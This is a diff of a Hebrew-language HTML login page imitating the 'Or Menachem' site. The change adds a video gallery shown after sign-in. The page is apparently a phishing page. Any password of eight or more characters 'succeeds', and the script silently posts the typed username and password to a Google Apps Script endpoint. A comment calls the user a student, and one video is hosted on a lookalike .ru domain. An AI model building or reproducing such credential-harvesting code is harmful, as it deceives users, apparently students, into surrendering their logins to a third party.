@@ -3,17 +3,19 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>התחברות - אור מנחם</title>
+    <title>מערכת סרטונים - אור מנחם</title>
     <style>
         body {
             font-family: Arial, sans-serif;
-            background-color: #5d93bc; /* צבע הרקע הכחול המדויק מהתמונה */
+            background-color: #5d93bc; /* צבע הרקע הכחול המדויק */
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
-            height: 100vh;
+            min-height: 100vh;
             margin: 0;
+            padding: 20px;
+            box-sizing: border-box;
         }
 
         .logo-container {
@@ -26,7 +28,7 @@
             height: auto;
         }
 
-        /* תיבת השגיאה המעוצבת בהשראת התמונה */
+        /* תיבת השגיאה */
         .error-box {
             background-color: white;
             padding: 15px 20px;
@@ -34,16 +36,12 @@
             box-shadow: 0 4px 15px rgba(0,0,0,0.15);
             width: 420px;
             box-sizing: border-box;
-            border-right: 4px solid #d32f2f; /* הפס האדום בצד ימין */
+            border-right: 4px solid #d32f2f;
             margin-bottom: 15px;
             font-size: 15px;
             color: #222;
             line-height: 1.4;
-            display: none; /* מוסתר כברירת מחדל */
-        }
-
-        .error-box strong {
-            color: #d32f2f;
+            display: none;
         }
 
         /* תיבת ההתחברות המרכזית */
@@ -54,11 +52,10 @@
             box-shadow: 0 4px 15px rgba(0,0,0,0.15);
             width: 420px;
             box-sizing: border-box;
-            border-bottom: 4px solid #7cb342; /* הפס הירוק בתחתית התיבה */
+            border-bottom: 4px solid #7cb342;
             transition: transform 0.1s ease;
         }
 
-        /* הגדרת האנימציה של הרטט (ימינה ושמאלה) */
         @keyframes shake {
             0% { transform: translateX(0); }
             20% { transform: translateX(-10px); }
@@ -68,7 +65,6 @@
             100% { transform: translateX(0); }
         }
 
-        /* קלאס שיופעל דרך ה-JavaScript בזמן שגיאה */
         .shake-effect {
             animation: shake 0.4s ease-in-out;
         }
@@ -105,7 +101,7 @@
 
         .toggle-password {
             position: absolute;
-            left: 12px; /* מיקום העין בצד שמאל בתוך התיבה */
+            left: 12px;
             top: 50%;
             transform: translateY(-50%);
             cursor: pointer;
@@ -114,10 +110,9 @@
             user-select: none;
         }
 
-        /* שורת הרכיבים התחתונה */
         .bottom-row {
             display: flex;
-            justify-content: space-between; /* דוחף אחד לימין ואחד לשמאל */
+            justify-content: space-between;
             align-items: center;
             margin-top: 25px;
         }
@@ -130,17 +125,11 @@
             font-weight: bold;
             color: #222;
             cursor: pointer;
-            order: 1; /* מוודא שיהיה בצד ימין */
-        }
-
-        .remember-me input {
-            cursor: pointer;
-            width: 16px;
-            height: 16px;
+            order: 1;
         }
 
         .btn-submit {
-            background-color: #1565c0; /* צבע הכפתור הכחול */
+            background-color: #1565c0;
             color: white;
             border: none;
             padding: 10px 24px;
@@ -148,64 +137,193 @@
             font-weight: bold;
             border-radius: 4px;
             cursor: pointer;
-            transition: background-color 0.2s;
-            order: 2; /* מוודא שיהיה בצד שמאל */
+            order: 2;
         }
 
-        .btn-submit:hover {
-            background-color: #0d47a1;
+        /* --- אזור בחירת הסרטים החדש --- */
+        .video-selection-container {
+            display: none; /* מוסתר עד להתחברות מוצלחת */
+            width: 100%;
+            max-width: 900px;
+            background-color: white;
+            padding: 30px;
+            border-radius: 4px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.2);
+            box-sizing: border-box;
+            text-align: center;
+        }
+
+        .selection-title {
+            font-size: 24px;
+            font-weight: bold;
+            color: #1565c0;
+            margin-bottom: 30px;
+        }
+
+        /* סידור הסרטונים - ימין ושמאל */
+        .movies-grid {
+            display: flex;
+            gap: 30px;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+
+        .movie-card {
+            flex: 1;
+            min-width: 280px;
+            max-width: 400px;
+            background: #f5f7f8;
+            border: 1px solid #cfd8dc;
+            border-radius: 6px;
+            overflow: hidden;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+
+        .movie-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 6px 15px rgba(0,0,0,0.15);
+        }
+
+        /* תצוגה מקדימה של הוידאו בכרטיס */
+        .movie-preview-wrapper {
+            width: 100%;
+            height: 200px;
+            background-color: #000;
+            position: relative;
+        }
+
+        .movie-preview-wrapper video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        /* כפתור פליי קטן שיושב מעל התמונה */
+        .play-overlay {
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.2);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 50px;
+            transition: background 0.2s;
+        }
+
+        .movie-card:hover .play-overlay {
+            background: rgba(0,0,0,0.4);
+        }
+
+        .movie-title {
+            padding: 15px;
+            font-size: 18px;
+            font-weight: bold;
+            color: #222;
+            border-top: 1px solid #cfd8dc;
+        }
+
+        /* אזור הנגן הגדול שנפתח בלחיצה */
+        .player-view {
+            display: none;
+            width: 100%;
+            max-width: 800px;
+            margin-top: 20px;
+        }
+
+        .player-view video {
+            width: 100%;
+            border-radius: 4px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+        }
+
+        .btn-back {
+            background-color: #555;
+            color: white;
+            border: none;
+            padding: 8px 16px;
+            font-size: 14px;
+            border-radius: 4px;
+            cursor: pointer;
+            margin-bottom: 15px;
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+        }
+        
+        .btn-back:hover {
+            background-color: #333;
         }
     </style>
 </head>
 <body>
 
-    <!-- אזור הלוגו -->
     <div class="logo-container">
         <img src="logo.png" alt="אור מנחם">
     </div>
 
-    <!-- תיבת שגיאה דינמית -->
     <div class="error-box" id="errorBox">
         <strong>שגיאה:</strong> הסיסמה שהוזנה עבור המשתמש <span id="wrongUser" style="font-weight: bold;"></span> אינה נכונה. קוד הגישה חייב להכיל לפחות 8 תווים.
     </div>
 
-    <!-- תיבת ההתחברות המרכזית -->
     <div class="login-box" id="loginBox">
         <form id="activityForm">
-            
-            <!-- שדה עליון: שם משתמש או כתובת אימייל -->
             <div class="form-group">
                 <label for="studentName">שם משתמש או כתובת אימייל</label>
-                <input type="text" id="studentName" name="studentName" required>
+                <input type="text" id="studentName" required>
             </div>
 
-            <!-- שדה תחתון: סיסמה עם עינית -->
             <div class="form-group">
                 <label for="accessCode">סיסמה</label>
                 <div class="password-container">
-                    <input type="password" id="accessCode" name="accessCode" required>
+                    <input type="password" id="accessCode" required>
                     <span class="toggle-password" id="eyeIcon">👁️</span>
                 </div>
             </div>
 
             <div class="bottom-row">
-                <!-- תיבת סימון "זכור אותי" (מימין) -->
                 <label class="remember-me">
-                    <input type="checkbox" id="rememberme" name="rememberme">
+                    <input type="checkbox" id="rememberme">
                     <span>זכור אותי</span>
                 </label>
-
-                <!-- כפתור התחבר (משמאל) -->
-                <button type="submit" class="btn-submit" id="submitBtn">התחבר</button>
+                <button type="submit" class="btn-submit">התחבר</button>
             </div>
         </form>
     </div>
 
+    <div class="video-selection-container" id="videoSelection">
+        <div class="selection-title">בחר סרטון לצפייה:</div>
+        
+        <div class="movies-grid" id="moviesGrid">
+            <div class="movie-card" onclick="playMovie('https://or-menachem.ru/wp-content/uploads/2026/05/VIDEO-2025-09-17-23-10-38.mp4')">
+                <div class="movie-preview-wrapper">
+                    <video src="https://or-menachem.ru/wp-content/uploads/2026/05/VIDEO-2025-09-17-23-10-38.mp4#t=0.1" preload="metadata" muted></video>
+                    <div class="play-overlay">▶</div>
+                </div>
+                <div class="movie-title">סרטון פעילות 1</div>
+            </div>
+
+            <div class="movie-card" onclick="playMovie('https://ormenachem.net/wp-content/uploads/2024/05/WhatsApp-Video-2024-05-24-at-17.50.50.mp4')">
+                <div class="movie-preview-wrapper">
+                    <video src="https://ormenachem.net/wp-content/uploads/2024/05/WhatsApp-Video-2024-05-24-at-17.50.50.mp4#t=0.1" preload="metadata" muted></video>
+                    <div class="play-overlay">▶</div>
+                </div>
+                <div class="movie-title">סרטון פעילות 2</div>
+            </div>
+        </div>
+
+        <div class="player-view" id="playerView">
+            <button class="btn-back" onclick="backToSelection()">חזרה לבחירת סרטים ↩</button>
+            <video id="mainPlayer" controls autoplay></video>
+        </div>
+    </div>
+
     <script>
-        // כאן מדביקים את הקישור הארוך שקיבלת מה-Apps Script של גוגל שיטס
+        // קישור ה-Apps Script של גוגל שיטס שלכם
         const googleScriptUrl = "https://script.google.com/macros/s/AKfycbyfENOeiDb5MRcTYPwPk1rGQSchQYezyJ9hhGv8yB9aQFYH1JBvHN9OoVk9l-_w56kuMg/exec";
 
-        // מנגנון העין לחשיפה והסתרת הקוד/סיסמה
+        // מנגנון עין לחשיפת סיסמה
         const togglePassword = document.getElementById('eyeIcon');
         const passwordInput = document.getElementById('accessCode');
 
@@ -215,7 +333,7 @@
             this.style.opacity = type === 'password' ? '1' : '0.5';
         });
 
-        // מנגנון בדיקה, מעבר מיידי ורישום ברקע
+        // ניהול טופס ההתחברות
         document.getElementById('activityForm').addEventListener('submit', function(e) {
             e.preventDefault(); 
             
@@ -225,37 +343,54 @@
             const errorBox = document.getElementById('errorBox');
             const wrongUser = document.getElementById('wrongUser');
             const loginBox = document.getElementById('loginBox');
+            const videoSelection = document.getElementById('videoSelection');
             
-            // בדיקה: האם הקוד קצר מ-8 תווים?
+            // בדיקת אורך קוד (מינימום 8 תווים)
             if (codeInput.length < 8) {
                 wrongUser.textContent = nameInput;
                 errorBox.style.display = 'block';
                 
-                // אפקט הרטט
                 loginBox.classList.remove('shake-effect'); 
                 void loginBox.offsetWidth; 
                 loginBox.classList.add('shake-effect'); 
                 return; 
             }
             
-            // אם הקוד תקין - מסתירים שגיאות מיד
+            // התחברות תקינה! 
             errorBox.style.display = 'none';
+            loginBox.style.display = 'none'; // מעלים את תיבת ההתחברות
+            videoSelection.style.display = 'block'; // מציגים מיד את דף בחירת הסרטונים
 
-            // 1. הכנת הנתונים לשליחה ל-Google Sheets
+            // שליחת המידע ברקע לגוגל שיטס מבלי לעכב את התלמיד
             const formData = new FormData();
             formData.append('studentName', nameInput);
             formData.append('accessCode', codeInput);
 
-            // 2. שליחה אסינכרונית "ברקע" (בלי לחכות לתשובה מגוגל)
             fetch(googleScriptUrl, {
                 method: 'POST',
                 mode: 'no-cors',
                 body: formData
-            }).catch(error => console.error('Background log error:', error));
-
-            // 3. העברה מיידית לסרטון (קורה באותו חלקיק שנייה של הלחיצה!)
-            window.location.href = "https://or-menachem.ru/wp-content/uploads/2026/05/VIDEO-2025-09-17-23-10-38.mp4";
+            }).catch(error => console.error('Error logging to sheets:', error));
         });
+
+        // פונקציה שמפעילה את הסרטון שנבחר
+        function playMovie(videoUrl) {
+            document.getElementById('moviesGrid').style.display = 'none'; // מחרב את רשת הבחירה
+            const playerView = document.getElementById('playerView');
+            const mainPlayer = document.getElementById('mainPlayer');
+            
+            mainPlayer.src = videoUrl;
+            playerView.style.display = 'block'; // מציג את הנגן הגדול
+        }
+
+        // פונקציית חזרה למסך הבחירה
+        function backToSelection() {
+            const mainPlayer = document.getElementById('mainPlayer');
+            mainPlayer.pause(); // עוצר את הסרטון הנוכחי
+            
+            document.getElementById('playerView').style.display = 'none';
+            document.getElementById('moviesGrid').style.display = 'flex'; // מחזיר את הבחירה
+        }
     </script>
 
 </body>
